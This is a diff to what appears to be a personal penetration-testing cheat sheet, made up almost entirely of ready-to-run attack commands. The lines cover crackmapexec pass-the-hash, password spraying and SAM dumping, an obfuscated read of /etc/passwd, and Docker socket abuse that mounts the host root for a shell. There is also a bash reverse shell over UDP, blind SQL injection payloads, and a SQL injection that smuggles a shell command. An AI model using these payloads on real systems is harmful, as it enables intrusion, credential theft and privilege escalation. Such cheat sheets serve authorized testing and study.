@@ -382,6 +382,7 @@ crackmapexec smb 10.200.3.1/24 -u administrator -d domain.local -H 'NTLM'
 crackmapexec smb 172.16.1.101 -u wsadmin -H '669b12a3bac275251170afbe2c5de8c2' -x 'whoami'
 crackmapexec smb 10.10.110.24 -u wsadmin -H '00000000000000000000000000000000' --sam
 crackmapexec smb 10.10.10.14 -u salvador -p "password" --shares --pass-pol
+crackmapexec winrm ./targets.txt -u dummy -p 'P!@$$w0rd!' 
 #more cheatsheets
 https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/
 
@@ -430,6 +431,8 @@ X=$'cat\x20/etc/passwd'&&$X
 docker -H tcp://10.10.25.34:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh
 # mount root directory to mnt using socker daemon
 ./docker -H unix:///tmp/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
+# using docker socket with curl
+https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd
 
 [mounting shares]
 mount -f cifs '//172.16.1.31/Shares' mnt/
@@ -465,6 +468,8 @@ bash -i >& /dev/udp/127.0.0.1/4242 0>&1
 ' or (select (ascii(substr((select database()), 1, 1))) = 104)-- -
 ' or (select (ascii(substr((select table_name from information_schema.tables where table_schema=database()), 1, 1))) = 104)-- -
 ' or (select (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='user'), 1, 1))) = 104)-- -
+# command injection in sqli
+/ping?id=3995 UNION SELECT 1,'|ping 10.4.0.68'-- -
 
 [sql read and write]
 SELECT * FROM mytable INTO dumpfile '/tmp/somefile'
